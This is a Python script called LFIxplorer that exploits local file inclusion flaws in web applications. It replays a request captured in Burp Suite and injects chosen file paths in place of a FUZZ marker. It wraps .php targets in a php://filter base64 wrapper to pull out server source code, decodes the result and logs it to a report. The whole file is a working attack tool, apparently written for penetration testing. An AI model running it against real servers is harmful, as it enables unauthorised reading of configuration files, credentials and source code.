import sys
import requests
import base64
import os
from urllib.parse import urlparse

def print_usage():
    print("Usage: python3 LFIxplorer.py <burpsuite_file>")
    print("The script requires a Burp Suite file containing the URL, cookies, headers, and payload.")
    print("Example: python3 LFIxplorer.py burp_output.txt")

def parse_burp_file(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            
            # Extract the method and path from the first line
            first_line = lines[0].strip()
            if not first_line.startswith("GET") and not first_line.startswith("POST"):
                raise ValueError("Invalid request format in the Burp Suite file.")
            
            method, path, _ = first_line.split(" ", 2)  # Split the first line
            
            # Extract the host from the second line
            host_line = lines[1].strip()
            if not host_line.startswith("Host:"):
                raise ValueError("Host header missing in the Burp Suite file.")
            
            host = host_line.replace("Host: ", "").strip()
            
            # Construct the full URL
            url = f"http://{host}{path}"
            
            # Extract cookies
            cookie_line = next((line for line in lines if line.startswith("Cookie:")), None)
            cookies = cookie_line.replace("Cookie: ", "").strip() if cookie_line else ""
            
            # Extract headers (all lines except the first and second)
            headers = {}
            header_lines = []
            for line in lines[2:]:
                if line.strip() == "":
                    break  # Stop at the first blank line
                if ": " in line:
                    key, value = line.strip().split(": ", 1)
                    headers[key] = value
                    header_lines.append(line)
            
            # Extract payload (everything after the headers)
            payload = ""
            payload_start = len(header_lines) + 2  # Start after headers
            if payload_start < len(lines):
                payload = "".join(lines[payload_start:]).strip()
            
            return url, cookies, headers, payload, method
    except Exception as e:
        print(f"Error reading Burp Suite file: {e}")
        sys.exit(1)



def send_request(url, cookies, headers, payload, method, user_input):
    try:
        # Parse the URL to get host and path
        parsed_url = urlparse(url)
        
        if not parsed_url.scheme:
            # If scheme is missing, add http:// by default
            url = f"http://{parsed_url.netloc}{parsed_url.path}"

        # Handle .php files with php://filter wrapper
        if user_input.endswith(".php"):
            user_input = f"php://filter/convert.base64-encode/resource={user_input}"
        
        # Replace FUZZ in the URL or payload
        if "FUZZ" in url:
            modified_url = url.replace("FUZZ", user_input)
            modified_payload = payload
        else:
            modified_url = url
            modified_payload = payload.replace("FUZZ", user_input)

        print(f"URL: {url}")
        print(f"User Input: {user_input}")
        print(f"Modified URL: {modified_url}")
        print(f"Modified Payload: {modified_payload}")
        
        try:
            headers["Cookie"] = cookies  # Add cookies to headers
            
            if method.upper() == "GET":
                response = requests.get(modified_url, headers=headers, params=modified_payload)
            elif method.upper() == "POST":
                response = requests.post(modified_url, headers=headers, data=modified_payload)
            else:
                print("Unsupported HTTP method.")
                return None
            
            return response.text
        except requests.exceptions.MissingSchema:
            print("Error: Missing schema in the URL. Ensure the URL starts with http:// or https://")
            return None
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")
            return None
    except ValueError as e:
        print(f"Error parsing URL: {e}")
        return None

def decode_base64(content):
    try:
        decoded = base64.b64decode(content).decode('utf-8')
        return decoded
    except Exception as e:
        print(f"Error decoding Base64 content: {e}")
        return content

def main():
    if len(sys.argv) != 2:
        print_usage()
        sys.exit(1)

    burp_file = sys.argv[1]

    if not os.path.exists(burp_file):
        print(f"File {burp_file} does not exist.")
        sys.exit(1)

    # Parse Burp Suite file
    url, cookies, headers, payload, method = parse_burp_file(burp_file)

    # Clear or create report file
    report_file = "LFIxplorer-report.txt"
    with open(report_file, 'w') as report:
        report.write("")

    while True:
        user_input = input("Enter the path of the file to view (or enter 0 to exit): ")

        if user_input == "0":
            print("Exiting...")
            break

        # Send the request
        response_content = send_request(url, cookies, headers, payload, method, user_input)

        if response_content is None:
            continue

        # Decode Base64 for .php files
        if user_input.startswith("php://filter"):
            response_content = decode_base64(response_content)

        # Display and log the response content
        print(response_content)
        with open(report_file, 'a') as report:
            report.write(f"Requested File: {user_input}\n")
            report.write(f"Response:\n{response_content}\n")
            report.write("\n\n\n" + "="*100 + "\n")

if __name__ == "__main__":
    main()
